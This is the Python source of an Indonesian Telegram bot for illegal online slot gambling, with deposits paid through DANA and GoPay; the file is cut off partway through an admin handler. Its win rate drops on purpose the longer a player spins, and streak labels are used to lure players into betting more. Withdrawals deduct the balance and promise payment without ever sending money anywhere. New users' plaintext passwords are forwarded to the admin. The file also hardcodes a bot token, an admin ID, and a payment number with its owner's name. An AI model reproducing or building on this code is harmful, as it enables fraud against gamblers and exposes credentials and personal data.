#!/usr/bin/env python3
# JUDOL BOT - FULL VERSION
# TOKEN: 7913598777:AAHHsSzkhEvTpbwUw87gUJ7OUbkftL9QSfA
# ADMIN ID: 6481058235

import os
import json
import time
import random
import hashlib
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ========== KONFIGURASI ==========
TOKEN = "7913598777:AAHHsSzkhEvTpbwUw87gUJ7OUbkftL9QSfA"
ADMIN_ID = 6481058235

# ========== FILE DATA ==========
USERS_FILE = "/tmp/users.json"
TRANSACTIONS_FILE = "/tmp/transactions.json"
PENDING_FILE = "/tmp/pending.json"
SPIN_COUNTS_FILE = "/tmp/spin_counts.json"

users = {}
transactions = []
pending_registrations = {}
pending_deposits = {}
user_spin_counts = {}

def load_data():
    global users, transactions, pending_registrations, pending_deposits, user_spin_counts
    try:
        with open(USERS_FILE, 'r') as f:
            users = json.load(f)
    except:
        users = {}
    try:
        with open(TRANSACTIONS_FILE, 'r') as f:
            transactions = json.load(f)
    except:
        transactions = []
    try:
        with open(PENDING_FILE, 'r') as f:
            data = json.load(f)
            pending_registrations = data.get('registrations', {})
            pending_deposits = data.get('deposits', {})
    except:
        pending_registrations = {}
        pending_deposits = {}
    try:
        with open(SPIN_COUNTS_FILE, 'r') as f:
            user_spin_counts = json.load(f)
    except:
        user_spin_counts = {}

def save_data():
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)
    with open(TRANSACTIONS_FILE, 'w') as f:
        json.dump(transactions, f)
    with open(PENDING_FILE, 'w') as f:
        json.dump({
            'registrations': pending_registrations,
            'deposits': pending_deposits
        }, f)
    with open(SPIN_COUNTS_FILE, 'w') as f:
        json.dump(user_spin_counts, f)

load_data()

# ========== PAYMENT & GAMES ==========
PAYMENT = {
    'dana': {'name': 'DANA', 'number': '085969081186', 'owner': 'YULIANA'},
    'gopay': {'name': 'GOPAY', 'number': '085969081186', 'owner': 'YULIANA'}
}

GAMES = {
    'mahjong': {'name': 'MAHJONG WAYS', 'emoji': '🎰', 'min_bet': 1000, 'max_bet': 100000},
    'starlight': {'name': 'STARLIGHT PRINCESS', 'emoji': '✨', 'min_bet': 1000, 'max_bet': 100000},
    'gates': {'name': 'GATES OF OLYMPUS', 'emoji': '🚪', 'min_bet': 1000, 'max_bet': 100000},
    'sweet': {'name': 'SWEET BONANZA', 'emoji': '🍬', 'min_bet': 1000, 'max_bet': 100000}
}

def generate_referral_code():
    return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=6))

def generate_trx_id():
    return f"TRX{datetime.now().strftime('%Y%m%d%H%M%S')}{random.randint(1000,9999)}"

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def get_user(telegram_id):
    uid = str(telegram_id)
    if uid in users:
        return users[uid]
    return None

def add_balance(user_id, amount, note, is_deposit=False):
    uid = str(user_id)
    if uid not in users:
        return False, "User tidak ditemukan!"
    
    users[uid]['balance'] += amount
    if is_deposit:
        users[uid]['total_deposit'] += amount
    
    trx = {
        'id': generate_trx_id(),
        'user_id': user_id,
        'username': users[uid]['username'],
        'type': 'DEPOSIT' if is_deposit else 'BONUS',
        'amount': amount,
        'note': note,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    transactions.append(trx)
    save_data()
    return True, trx['id']

def deduct_balance(user_id, amount, note):
    uid = str(user_id)
    if uid not in users:
        return False, "User tidak ditemukan!"
    
    if users[uid]['balance'] < amount:
        return False, "Saldo tidak mencukupi!"
    
    users[uid]['balance'] -= amount
    if 'spin' in note.lower():
        users[uid]['total_spin'] += 1
    
    trx = {
        'id': generate_trx_id(),
        'user_id': user_id,
        'username': users[uid]['username'],
        'type': 'SPIN' if 'spin' in note.lower() else 'WITHDRAW',
        'amount': amount,
        'note': note,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    transactions.append(trx)
    save_data()
    return True, trx['id']

def add_win(user_id, amount, game):
    uid = str(user_id)
    if uid in users:
        users[uid]['balance'] += amount
        users[uid]['total_win'] += amount
        save_data()

# ========== SLOT SPIN DENGAN POLA WIN/LOSE & FOTO ==========
def spin_slot_with_pattern(user_id, bet, game):
    """Slot dengan pola win di awal, kalah di akhir, dan foto kalo menang"""
    
    # Track spin count per user
    if str(user_id) not in user_spin_counts:
        user_spin_counts[str(user_id)] = 0
    user_spin_counts[str(user_id)] += 1
    spin_num = user_spin_counts[str(user_id)]
    save_data()
    
    # Tentukan win rate berdasarkan jumlah spin
    if spin_num <= 10:
        win_rate = 0.70  # 70% win di awal
        streak = "🔥 HOT STREAK"
    elif spin_num <= 50:
        win_rate = 0.40  # 40% win di tengah
        streak = "⚡ NORMAL"
    else:
        win_rate = 0.20  # 20% win di akhir (banyak kalah)
        streak = "❄️ COLD STREAK"
    
    # Multiplier random (tidak bulat)
    multipliers = [
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  # lose
        0.3, 0.5, 0.7, 0.9,              # small win
        1.0, 1.2, 1.5, 1.8, 2.0,        # medium win
        2.5, 3.0, 4.0, 5.0,              # big win
        7.5, 10.0, 12.5, 15.0,           # mega win
        20.0, 25.0, 30.0, 40.0,          # jackpot
        50.0, 75.0, 100.0, 150.0,        # super jackpot
        200.0, 250.0, 500.0, 1000.0      # grand jackpot
    ]
    
    # Tentukan apakah menang
    is_win = random.random() < win_rate
    
    if is_win:
        # Pilih multiplier berdasarkan win rate
        if win_rate >= 0.6:
            multiplier = random.choice(multipliers[15:])  # dari 2.5 ke atas
        elif win_rate >= 0.35:
            multiplier = random.choice(multipliers[10:25])  # dari 1.0 ke 15.0
        else:
            multiplier = random.choice(multipliers[5:15])  # dari 0.5 ke 5.0
        
        win_amount = int(bet * multiplier)
        
        # Tambah random biar ga bulat
        if win_amount > 0:
            random_cents = random.randint(-500, 500)
            win_amount = max(100, win_amount + random_cents)
        
        # Jenis kemenangan dan foto
        if multiplier >= 500:
            result_type = "💎 GRAND JACKPOT"
            emoji = "💎"
            image = "🎰"  # placeholder foto
        elif multiplier >= 250:
            result_type = "👑 MAJOR JACKPOT"
            emoji = "👑"
            image = "🎰"
        elif multiplier >= 100:
            result_type = "🏆 MEGA JACKPOT"
            emoji = "🏆"
            image = "🎰"
        elif multiplier >= 50:
            result_type = "🎉 SUPER JACKPOT"
            emoji = "🎉"
            image = "🎰"
        elif multiplier >= 25:
            result_type = "🎰 JACKPOT"
            emoji = "🎰"
            image = "🎰"
        elif multiplier >= 10:
            result_type = "🔥 MEGA WIN"
            emoji = "🔥"
            image = "🎰"
        elif multiplier >= 5:
            result_type = "🎉 BIG WIN"
            emoji = "🎉"
            image = "🎰"
        elif multiplier >= 2:
            result_type = "😊 WIN"
            emoji = "😊"
            image = "🎰"
        else:
            result_type = "😊 SMALL WIN"
            emoji = "😊"
            image = "🎰"
        
        return {
            'win': win_amount,
            'type': result_type,
            'multiplier': multiplier,
            'bet': bet,
            'game': game,
            'is_win': True,
            'spin_num': spin_num,
            'win_rate': win_rate,
            'streak': streak,
            'emoji': emoji,
            'image': image
        }
    else:
        return {
            'win': 0,
            'type': '😢 LOSE',
            'multiplier': 0,
            'bet': bet,
            'game': game,
            'is_win': False,
            'spin_num': spin_num,
            'win_rate': win_rate,
            'streak': streak,
            'emoji': '😢',
            'image': '🎰'
        }

def format_spin_result(result, game_data, user_balance):
    """Format hasil spin dengan emoji dan foto"""
    spin_num = result['spin_num']
    win = result['win']
    bet = result['bet']
    streak = result['streak']
    
    # Format nominal
    bet_formatted = f"{bet:,}".replace(",", ".")
    
    if win > 0:
        win_formatted = f"{win:,}".replace(",", ".")
        
        # Header berdasarkan jenis kemenangan
        if result['multiplier'] >= 100:
            header = f"{result['emoji']}{result['emoji']}{result['emoji']} {result['type']} {result['emoji']}{result['emoji']}{result['emoji']}"
            border = "═" * 45
        elif result['multiplier'] >= 25:
            header = f"{result['emoji']}{result['emoji']} {result['type']} {result['emoji']}{result['emoji']}"
            border = "═" * 42
        else:
            header = f"{result['emoji']} {result['type']} {result['emoji']}"
            border = "═" * 38
        
        result_text = f"""
{header}
{border}

{game_data['emoji']} *{game_data['name']}*

🎲 *Spin ke-{spin_num}*
💰 *Bet:* Rp {bet_formatted}
🎯 *Multiplier:* x{result['multiplier']}
🏆 *WIN:* Rp {win_formatted}

📊 *Streak:* {streak}

{border}
💵 *Saldo Baru:* Rp {user_balance:,.0f}

🎉 *SELAMAT!* 🎉
"""
    else:
        result_text = f"""
😢😢😢 {result['type']} 😢😢😢
{'═' * 38}

{game_data['emoji']} *{game_data['name']}*

🎲 *Spin ke-{spin_num}*
💰 *Bet:* Rp {bet_formatted}
🎯 *Result:* LOSE

📊 *Streak:* {streak}

{'═' * 38}
💵 *Saldo Baru:* Rp {user_balance:,.0f}

💪 *Semangat! Spin lagi!*
"""
    
    return result_text

def get_user_stats(user_id):
    if str(user_id) in user_spin_counts:
        spins = user_spin_counts[str(user_id)]
        if spins <= 10:
            status = "🔥 HOT STREAK - Peluang Menang Tinggi!"
        elif spins <= 50:
            status = "⚡ NORMAL - Peluang Menang Standar"
        else:
            status = "❄️ COLD STREAK - Peluang Menang Rendah"
        return spins, status
    return 0, "Belum ada spin"

# ========== NOTIFIKASI ADMIN ==========
async def notify_admin_register(context, telegram_id, username, password):
    keyboard = [
        [InlineKeyboardButton("✅ APPROVE", callback_data=f"reg_approve_{telegram_id}")],
        [InlineKeyboardButton("❌ REJECT", callback_data=f"reg_reject_{telegram_id}")]
    ]
    
    message = f"📝 *REGISTRASI BARU*\n\n"
    message += f"👤 Username: {username}\n"
    message += f"🆔 Telegram ID: {telegram_id}\n"
    message += f"🔑 Password: {password}\n"
    message += f"🕐 Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    message += f"Klik APPROVE untuk mengaktifkan akun."
    
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=message,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def notify_admin_deposit(context, user_id, username, amount, method, trx_id):
    keyboard = [
        [InlineKeyboardButton("✅ APPROVE", callback_data=f"deposit_approve_{trx_id}")],
        [InlineKeyboardButton("❌ REJECT", callback_data=f"deposit_reject_{trx_id}")]
    ]
    
    # Hitung bonus
    bonus = 0
    if amount >= 100000:
        bonus = int(amount * 0.1)
    elif amount >= 50000:
        bonus = int(amount * 0.05)
    total = amount + bonus
    
    message = f"💰 *DEPOSIT PENDING*\n\n"
    message += f"👤 User: {username}\n"
    message += f"🆔 ID: {user_id}\n"
    message += f"💰 Nominal: Rp {amount:,.0f}\n"
    message += f"🎁 Bonus: Rp {bonus:,.0f}\n"
    message += f"💵 Total: Rp {total:,.0f}\n"
    message += f"💳 Metode: {method.upper()}\n"
    message += f"🆔 Trx ID: {trx_id}\n"
    message += f"🕐 Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    message += f"Klik APPROVE untuk menambah saldo."
    
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=message,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ========== TELEGRAM HANDLERS ==========
async def start(update: Update, context):
    user = update.effective_user
    user_data = get_user(user.id)
    
    if user_data:
        keyboard = [
            [InlineKeyboardButton("🎰 PILIH GAME", callback_data='games')],
            [InlineKeyboardButton("💰 DEPOSIT", callback_data='deposit')],
            [InlineKeyboardButton("💳 WITHDRAW", callback_data='withdraw')],
            [InlineKeyboardButton("📊 STATUS", callback_data='status')],
            [InlineKeyboardButton("🎁 BONUS", callback_data='bonus')],
            [InlineKeyboardButton("👥 REFERRAL", callback_data='referral')],
            [InlineKeyboardButton("📜 HISTORY", callback_data='history')]
        ]
        
        await update.message.reply_text(
            f"🎰 *JUDOL BOT* 🎰\n\n"
            f"👋 Welcome {user_data['username']}!\n\n"
            f"💰 *Saldo:* Rp {user_data['balance']:,.0f}\n"
            f"🎲 *Total Spin:* {user_data['total_spin']}\n"
            f"🏆 *Total Win:* Rp {user_data['total_win']:,.0f}\n\n"
            f"📌 *Pilih menu:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    else:
        keyboard = [
            [InlineKeyboardButton("📝 REGISTER", callback_data='register')],
            [InlineKeyboardButton("🔐 LOGIN", callback_data='login')]
        ]
        
        await update.message.reply_text(
            f"🎰 *JUDOL BOT* 🎰\n\n"
            f"👋 Halo {user.first_name}!\n\n"
            f"⚠️ *Anda belum memiliki akun!*\n\n"
            f"Silakan REGISTER terlebih dahulu.\n"
            f"Pendaftaran akan dikonfirmasi oleh admin.\n\n"
            f"📌 *Pilih menu:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

# ========== REGISTER ==========
async def register_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"📝 *REGISTRASI AKUN*\n\n"
        f"Format: `username|password`\n\n"
        f"Contoh: `jokosusanto|12345`\n\n"
        f"📌 *Catatan:*\n"
        f"- Username minimal 3 karakter\n"
        f"- Password minimal 4 karakter\n"
        f"- Pendaftaran akan dikonfirmasi admin\n\n"
        f"Ketik format di chat:",
        parse_mode='Markdown'
    )
    context.user_data['waiting_register'] = True

async def handle_register(update: Update, context):
    try:
        text = update.message.text.strip()
        parts = text.split('|')
        
        if len(parts) != 2:
            await update.message.reply_text("❌ Format salah! Gunakan: username|password")
            return
        
        username = parts[0].strip()
        password = parts[1].strip()
        telegram_id = update.effective_user.id
        
        if len(username) < 3:
            await update.message.reply_text("❌ Username minimal 3 karakter!")
            return
        
        if len(password) < 4:
            await update.message.reply_text("❌ Password minimal 4 karakter!")
            return
        
        # Cek username sudah ada
        for uid, data in users.items():
            if data.get('username') == username:
                await update.message.reply_text("❌ Username sudah digunakan!")
                return
        
        # Cek apakah sudah dalam pending
        if str(telegram_id) in pending_registrations:
            await update.message.reply_text("⚠️ Anda sudah mendaftar! Tunggu konfirmasi admin.")
            return
        
        # Simpan pending registration
        pending_registrations[str(telegram_id)] = {
            'telegram_id': telegram_id,
            'username': username,
            'password': password,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        save_data()
        
        # Kirim notifikasi ke admin
        await notify_admin_register(context, telegram_id, username, password)
        
        await update.message.reply_text(
            f"✅ *REGISTRASI DIAJUKAN!*\n\n"
            f"👤 Username: {username}\n"
            f"🔑 Password: {password}\n\n"
            f"📌 *TUNGGU KONFIRMASI DARI ADMIN*\n"
            f"Admin akan mengaktifkan akun Anda.\n\n"
            f"⏱️ Estimasi: 1-5 menit\n\n"
            f"Ketik /start setelah di-approve!",
            parse_mode='Markdown'
        )
        
        context.user_data['waiting_register'] = False
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ========== LOGIN ==========
async def login_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"🔐 *LOGIN*\n\n"
        f"Format: `username|password`\n\n"
        f"Contoh: `jokosusanto|12345`\n\n"
        f"Ketik format di chat:",
        parse_mode='Markdown'
    )
    context.user_data['waiting_login'] = True

async def handle_login(update: Update, context):
    try:
        text = update.message.text.strip()
        parts = text.split('|')
        
        if len(parts) != 2:
            await update.message.reply_text("❌ Format salah! Gunakan: username|password")
            return
        
        username = parts[0].strip()
        password = parts[1].strip()
        telegram_id = update.effective_user.id
        
        # Cari user
        found = False
        for uid, data in users.items():
            if data.get('username') == username and data.get('password') == hash_password(password):
                users[str(telegram_id)] = data
                del users[uid]
                save_data()
                found = True
                break
        
        if found:
            await update.message.reply_text(
                f"✅ *LOGIN BERHASIL!*\n\n"
                f"👤 Selamat datang {username}!\n"
                f"💰 Saldo: Rp {users[str(telegram_id)]['balance']:,.0f}\n\n"
                f"Ketik /start untuk mulai main!",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Username atau password salah!")
        
        context.user_data['waiting_login'] = False
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ========== DEPOSIT ==========
async def deposit_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    user_data = get_user(update.effective_user.id)
    if not user_data:
        await query.edit_message_text("❌ Anda belum login! Ketik /start")
        return
    
    keyboard = [
        [InlineKeyboardButton("💙 DANA", callback_data='deposit_dana')],
        [InlineKeyboardButton("💚 GOPAY", callback_data='deposit_gopay')],
        [InlineKeyboardButton("🔙 BACK", callback_data='back_main')]
    ]
    
    await query.edit_message_text(
        f"💰 *DEPOSIT*\n\n"
        f"Pilih metode deposit:\n\n"
        f"💙 *DANA* - {PAYMENT['dana']['number']} a.n {PAYMENT['dana']['owner']}\n"
        f"💚 *GOPAY* - {PAYMENT['gopay']['number']} a.n {PAYMENT['gopay']['owner']}\n\n"
        f"📌 *Minimal Deposit:* Rp 10,000\n"
        f"🎁 *Bonus Deposit:* 5% (min Rp 50,000) | 10% (min Rp 100,000)\n\n"
        f"⚠️ *SETELAH TRANSFER, KETIK NOMINAL DI CHAT*\n"
        f"⚠️ *Saldo akan masuk setelah admin APPROVE!*\n\n"
        f"Ketik nominal:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def deposit_method(update: Update, context):
    query = update.callback_query
    method = query.data.replace('deposit_', '')
    await query.answer()
    
    await query.edit_message_text(
        f"💳 *DEPOSIT {method.upper()}*\n\n"
        f"📱 *Nomor:* `{PAYMENT[method]['number']}`\n"
        f"👤 *Nama:* {PAYMENT[method]['owner']}\n\n"
        f"💰 *Masukkan nominal deposit:*\n"
        f"Contoh: *50000*\n\n"
        f"📌 *CARA DEPOSIT:*\n"
        f"1. Transfer ke nomor di atas\n"
        f"2. Ketik nominal di chat\n"
        f"3. *TUNGGU KONFIRMASI DARI ADMIN*\n\n"
        f"Ketik nominal:",
        parse_mode='Markdown'
    )
    context.user_data['deposit_method'] = method
    context.user_data['waiting_deposit'] = True

async def handle_deposit(update: Update, context):
    try:
        amount = int(update.message.text.strip())
        if amount < 10000:
            await update.message.reply_text("⚠️ Minimal deposit Rp 10,000!")
            return
        
        method = context.user_data.get('deposit_method')
        telegram_id = update.effective_user.id
        user_data = get_user(telegram_id)
        
        if not user_data:
            await update.message.reply_text("❌ Anda belum login! Ketik /start")
            return
        
        trx_id = generate_trx_id()
        
        # Simpan pending deposit
        pending_deposits[trx_id] = {
            'user_id': telegram_id,
            'username': user_data['username'],
            'amount': amount,
            'method': method,
            'status': 'pending',
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        save_data()
        
        # Kirim notifikasi ke admin
        await notify_admin_deposit(context, telegram_id, user_data['username'], amount, method, trx_id)
        
        await update.message.reply_text(
            f"✅ *DEPOSIT DIAJUKAN!*\n\n"
            f"💰 Nominal: Rp {amount:,.0f}\n"
            f"💳 Metode: {method.upper()}\n"
            f"🆔 ID: `{trx_id}`\n\n"
            f"📌 *TUNGGU KONFIRMASI DARI ADMIN*\n"
            f"Saldo akan otomatis masuk setelah admin approve.\n\n"
            f"⏱️ Estimasi: 1-5 menit",
            parse_mode='Markdown'
        )
        
        context.user_data['waiting_deposit'] = False
        
    except ValueError:
        await update.message.reply_text("❌ Masukkan nominal yang benar! Contoh: 50000")

# ========== GAME ==========
async def games_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    keyboard = []
    for key, game in GAMES.items():
        keyboard.append([InlineKeyboardButton(f"{game['emoji']} {game['name']}", callback_data=f"game_{key}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data='back_main')])
    
    await query.edit_message_text(
        f"🎰 *PILIH GAME*\n\n"
        f"💰 Min Bet: Rp 1,000\n"
        f"💰 Max Bet: Rp 100,000\n\n"
        f"📊 *Info:*\n"
        f"• 10 spin pertama: Hot Streak 🔥\n"
        f"• 11-50 spin: Normal ⚡\n"
        f"• 50+ spin: Cold Streak ❄️\n\n"
        f"🎮 Pilih game:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def game_play(update: Update, context):
    query = update.callback_query
    game_key = query.data.replace('game_', '')
    game_data = GAMES[game_key]
    
    await query.answer()
    
    # Dapatkan statistik user
    user_id = update.effective_user.id
    spin_count, streak_status = get_user_stats(user_id)
    
    keyboard = [
        [InlineKeyboardButton("🔄 SPIN 1x (Rp 1,000)", callback_data=f"spin_{game_key}_1000")],
        [InlineKeyboardButton("🔄 SPIN 3x (Rp 3,000)", callback_data=f"spin_{game_key}_3000")],
        [InlineKeyboardButton("🔄 SPIN 10x (Rp 10,000)", callback_data=f"spin_{game_key}_10000")],
        [InlineKeyboardButton("🔙 BACK", callback_data='games')]
    ]
    
    await query.edit_message_text(
        f"{game_data['emoji']} *{game_data['name']}*\n\n"
        f"💰 Min Bet: Rp {game_data['min_bet']:,}\n"
        f"💰 Max Bet: Rp {game_data['max_bet']:,}\n\n"
        f"📊 *Statistik Anda:*\n"
        f"🎲 Total Spin: {spin_count}\n"
        f"{streak_status}\n\n"
        f"🎲 Pilih nominal spin:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def spin_handler(update: Update, context):
    query = update.callback_query
    parts = query.data.split('_')
    
    game_key = parts[1]
    bet = int(parts[2])
    user_id = update.effective_user.id
    user_data = get_user(user_id)
    
    if not user_data:
        await query.answer("Anda belum login!", show_alert=True)
        return
    
    game_data = GAMES[game_key]
    
    if user_data['balance'] < bet:
        await query.answer("Saldo tidak mencukupi!", show_alert=True)
        return
    
    # Kurangi saldo
    deduct_balance(user_id, bet, f"SPIN {game_data['name']}")
    
    # Hasil spin dengan pola win/lose
    result = spin_slot_with_pattern(user_id, bet, game_key)
    
    # Tambah saldo jika menang
    if result['win'] > 0:
        add_win(user_id, result['win'], game_data['name'])
    
    # Update user data
    user_data = get_user(user_id)
    
    # Format hasil
    result_text = format_spin_result(result, game_data, user_data['balance'])
    
    # Keyboard setelah spin
    keyboard = [
        [InlineKeyboardButton("🔄 SPIN LAGI", callback_data=f"game_{game_key}")],
        [InlineKeyboardButton("🎰 GANTI GAME", callback_data='games')],
        [InlineKeyboardButton("🏠 MAIN MENU", callback_data='back_main')]
    ]
    
    await query.edit_message_text(
        result_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# ========== WITHDRAW ==========
async def withdraw_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    user_data = get_user(update.effective_user.id)
    if not user_data:
        await query.edit_message_text("❌ Anda belum login!")
        return
    
    keyboard = [
        [InlineKeyboardButton("💙 DANA", callback_data='withdraw_dana')],
        [InlineKeyboardButton("💚 GOPAY", callback_data='withdraw_gopay')],
        [InlineKeyboardButton("🔙 BACK", callback_data='back_main')]
    ]
    
    await query.edit_message_text(
        f"💳 *WITHDRAW*\n\n"
        f"💰 Saldo: Rp {user_data['balance']:,.0f}\n\n"
        f"📌 Minimal: Rp 50,000\n\n"
        f"Format: `nominal|nomor_akun`\n"
        f"Contoh: `100000|085969081186`\n\n"
        f"Ketik format di chat:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def withdraw_form(update: Update, context):
    query = update.callback_query
    method = query.data.replace('withdraw_', '')
    await query.answer()
    
    await query.edit_message_text(
        f"💳 *WITHDRAW {method.upper()}*\n\n"
        f"Format: `nominal|nomor_akun`\n\n"
        f"Contoh: `100000|085969081186`\n\n"
        f"Ketik format di chat:",
        parse_mode='Markdown'
    )
    context.user_data['withdraw_method'] = method
    context.user_data['waiting_withdraw'] = True

async def handle_withdraw(update: Update, context):
    try:
        text = update.message.text.strip()
        parts = text.split('|')
        
        if len(parts) != 2:
            await update.message.reply_text("❌ Format salah! Gunakan: nominal|nomor_akun")
            return
        
        amount = int(parts[0])
        account = parts[1]
        method = context.user_data.get('withdraw_method')
        user_id = update.effective_user.id
        user_data = get_user(user_id)
        
        if not user_data:
            await update.message.reply_text("❌ Anda belum login!")
            return
        
        if amount < 50000:
            await update.message.reply_text("⚠️ Minimal withdraw Rp 50,000!")
            return
        
        if user_data['balance'] < amount:
            await update.message.reply_text("⚠️ Saldo tidak mencukupi!")
            return
        
        success, trx_id = deduct_balance(user_id, amount, f"WITHDRAW via {method.upper()}")
        
        if success:
            await update.message.reply_text(
                f"✅ *WITHDRAW BERHASIL!*\n\n"
                f"💰 Nominal: Rp {amount:,.0f}\n"
                f"💳 Metode: {method.upper()}\n"
                f"📱 Akun: {account}\n"
                f"💵 Sisa: Rp {get_user(user_id)['balance']:,.0f}\n\n"
                f"💰 Dana akan dikirim dalam 1-5 menit!",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(f"❌ {trx_id}")
        
        context.user_data['waiting_withdraw'] = False
        
    except ValueError:
        await update.message.reply_text("❌ Masukkan nominal yang benar!")

# ========== STATUS ==========
async def status_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    user_data = get_user(update.effective_user.id)
    if not user_data:
        await query.edit_message_text("❌ Anda belum login!")
        return
    
    spin_count, streak_status = get_user_stats(update.effective_user.id)
    
    status_text = f"📊 *STATUS*\n\n"
    status_text += f"👤 Username: {user_data['username']}\n"
    status_text += f"💰 Saldo: Rp {user_data['balance']:,.0f}\n"
    status_text += f"💵 Deposit: Rp {user_data['total_deposit']:,.0f}\n"
    status_text += f"🎲 Spin: {user_data['total_spin']}\n"
    status_text += f"🏆 Win: Rp {user_data['total_win']:,.0f}\n"
    status_text += f"📊 Streak: {streak_status}\n"
    status_text += f"🔗 Kode: {user_data['referral_code']}\n"
    status_text += f"📅 Join: {user_data['joined']}\n"
    
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data='back_main')]]
    
    await query.edit_message_text(
        status_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# ========== BONUS ==========
async def bonus_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    user_data = get_user(update.effective_user.id)
    if not user_data:
        await query.edit_message_text("❌ Anda belum login!")
        return
    
    today = datetime.now().strftime('%Y-%m-%d')
    can_claim = user_data.get('last_bonus') != today
    
    keyboard = []
    if can_claim:
        keyboard.append([InlineKeyboardButton("🎁 DAILY BONUS", callback_data='bonus_daily')])
    keyboard.append([InlineKeyboardButton("👥 REFERRAL", callback_data='bonus_referral')])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data='back_main')])
    
    await query.edit_message_text(
        f"🎁 *BONUS*\n\n"
        f"💰 Saldo: Rp {user_data['balance']:,.0f}\n\n"
        f"Daily Bonus: {'✅ READY' if can_claim else '❌ CLAIMED'}\n"
        f"Referral: Rp 10,000 per referral\n\n"
        f"Pilih bonus:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def bonus_daily(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    user_data = get_user(user_id)
    today = datetime.now().strftime('%Y-%m-%d')
    
    if user_data.get('last_bonus') == today:
        await query.edit_message_text("❌ Sudah claim hari ini!")
        return
    
    bonus = random.randint(5000, 25000)
    user_data['last_bonus'] = today
    add_balance(user_id, bonus, "Daily Bonus")
    
    await query.edit_message_text(
        f"🎉 *DAILY BONUS!*\n\n"
        f"💰 Bonus: Rp {bonus:,.0f}\n"
        f"💵 Saldo: Rp {get_user(user_id)['balance']:,.0f}",
        parse_mode='Markdown'
    )

async def bonus_referral(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    user_data = get_user(update.effective_user.id)
    
    await query.edit_message_text(
        f"👥 *REFERRAL*\n\n"
        f"🔗 Kode: `{user_data['referral_code']}`\n\n"
        f"👥 Total: {user_data.get('referral_count', 0)} orang\n"
        f"💰 Bonus: Rp {user_data.get('referral_bonus', 0):,.0f}\n\n"
        f"📌 Bagikan link:\n"
        f"`https://t.me/JudolBot?start={user_data['referral_code']}`",
        parse_mode='Markdown'
    )

# ========== HISTORY ==========
async def history_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    user_data = get_user(update.effective_user.id)
    if not user_data:
        await query.edit_message_text("❌ Anda belum login!")
        return
    
    user_transactions = [t for t in transactions if str(t['user_id']) == str(update.effective_user.id)]
    user_transactions.reverse()
    last_10 = user_transactions[:10]
    
    if not last_10:
        await query.edit_message_text("📜 Belum ada history")
        return
    
    text = "📜 *HISTORY*\n\n"
    for t in last_10:
        icon = "➕" if t['type'] in ['DEPOSIT', 'BONUS', 'WIN'] else "➖"
        text += f"{icon} {t['type']}: Rp {t['amount']:,.0f}\n"
        text += f"   🕐 {t['time'][:16]}\n\n"
    
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data='back_main')]]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# ========== ADMIN HANDLERS ==========
async def admin_approve_register(update: Update, context):
    query = update.callback_query
    data = query.data
    telegram_id = data.replace('reg_approve_', '')
    
    if telegram_id not in pending_registrations:
        await query.answer("Request tidak ditemukan!", show_alert=True)
        return
    
    req = pending_registrations[telegram_id]
    
    users[telegram_id] = {
        'telegram_id': int(telegram_id),
        'username': req['username'],
        'password': hash_password(req['password']),
        'balance': 0,
        'total_deposit': 0,
        'total_withdraw': 0,
        'total_spin': 0,
        'total_win': 0,
        'referral_code': generate_referral_code(),
        'joined': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'last_bonus': None
    }
    
    del pending_registrations[telegram_id]
    save_data()
    
    await query.edit_message_text(
        f"✅ *REGISTRASI APPROVED!*\n\n"
        f"👤 Username: {req['username']}\n"
        f"🆔 Telegram ID: {telegram_id}\n\n"
        f"✅ Akun telah diaktifkan!",
